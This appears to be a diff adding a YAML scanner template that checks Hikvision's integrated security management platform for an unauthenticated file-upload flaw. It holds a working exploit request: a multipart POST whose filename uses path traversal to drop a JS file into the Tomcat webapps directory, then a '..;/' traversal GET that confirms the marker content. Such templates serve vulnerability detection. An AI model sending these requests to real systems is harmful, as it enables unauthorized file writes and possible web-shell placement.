@@ -1,0 +1,20 @@
+name: HIKVISION-综合安防管理平台-uploadAllPackage文件上传
+description: >
+  js文件上传
+alwaysExecute: false
+matchCount: 2
+rules:
+  - method: POST
+    path: /center_install/picUploadService/v1/uploadAllPackage/image
+    headers:
+      Content-Type: multipart/form-data; boundary=--------------------------553898708333958420021355
+    body: "----------------------------553898708333958420021355\r\nContent-Disposition: form-data; name=\"sendfile\"; filename=\"../../../../components/tomcat85linux64.1/webapps/eportal/360.js\"\r\nContent-Type: application/octet-stream\r\n\r\n112233\r\n----------------------------553898708333958420021355--"
+    expression:
+      headers:
+        Content-Type: application/json  
+  - method: GET
+    path: "/portal/ui/login/..;/..;/360.js"
+    expression:
+      status: 200
+      body_all:
+        - "112233"
